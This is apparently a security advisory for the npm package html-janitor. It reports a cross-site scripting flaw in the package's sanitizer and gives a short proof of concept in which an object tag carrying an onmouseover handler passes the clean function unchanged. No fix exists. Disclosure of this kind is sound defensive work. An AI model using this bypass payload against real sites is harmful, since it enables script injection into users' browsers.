## Overview
[html-janitor](https://www.npmjs.com/package/html-janitor) helps clean up your markup and allows you to take control of your HTML.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks. Arbitrary HTML can pass the sanitization process, which can be unexpected and dangerous (XSS) in case user-controlled input is passed to the clean function.

## PoC by Martin Bajanik

```js
var myJanitor = new HTMLJanitor({tags:{p:{}}});
var cleanHtml = myJanitor.clean("<form><object onmouseover=alert(document.domain) name=_sanitized></object></form>")
console.log(cleanHtml) 
// logs: <form><object onmouseover=alert(document.domain) name=_sanitized></object></form>
```

## Remediation
There is no fixed version for `html-janitor`.

## References
- [GitHub Issue](https://github.com/guardian/html-janitor/issues/35)
- [HackerOne Report](https://hackerone.com/reports/308158)
